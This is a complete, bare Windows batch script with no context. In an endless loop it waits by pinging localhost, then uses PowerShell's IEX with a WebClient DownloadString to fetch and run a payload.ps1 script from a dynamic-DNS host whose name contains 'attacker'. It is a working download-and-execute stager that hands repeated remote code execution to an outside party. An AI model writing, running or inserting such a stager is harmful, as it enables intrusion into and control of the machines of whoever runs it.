echo off
:loop
ping localhost -n 10
powershell -C IEX (new-object net.Webclient).DownloadString('http://maqattacker2.hopto.org:8080/payload.ps1');
goto loop
